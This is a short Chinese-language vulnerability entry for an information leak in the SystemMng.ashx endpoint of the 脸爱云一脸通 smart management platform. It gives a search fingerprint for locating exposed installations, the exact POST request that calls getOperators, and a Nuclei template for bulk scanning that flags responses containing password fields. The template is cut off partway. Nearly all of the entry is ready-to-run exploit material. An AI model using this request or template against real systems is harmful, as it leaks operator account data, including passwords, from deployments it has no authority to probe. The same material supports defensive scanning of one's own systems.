# 脸爱云一脸通智慧平台SystemMng信息泄露漏洞

- **系统**：脸爱云一脸通智慧平台SystemMng　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="View/UserReserved/UserReservedTest.aspx"`
- **请求**：`POST /SystemMng.ashx HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Length: 91`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
page=1&arr_search=%7B%22username%22%3A%22%22%2C%22memo%22%3A%22%22%7D&funcName=getOperators
Nuclei批量检测-文件名保存为yaml即可：
id: POC-Jocat-layun-SystemMng-UserInfo-leak
info:
name: 脸爱云一脸通智慧管理平台SystemMng.ashx信息泄露漏洞
author: HackTwo
severity: high
http:
- raw:
-
POST /SystemMng.ashx HTTP/1.1
Host: {{Hostname}}
Content-Length: 91
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
page=1&arr_search=%7B%22username%22%3A%22%22%2C%22memo%22%3A%22%22%7D&funcName=getOperators
matchers:
- type: dsl
dsl:
- status_code==200 && contains_all(body,"rows","memo","password",…（脚本共 638 字，完整版见原文）
```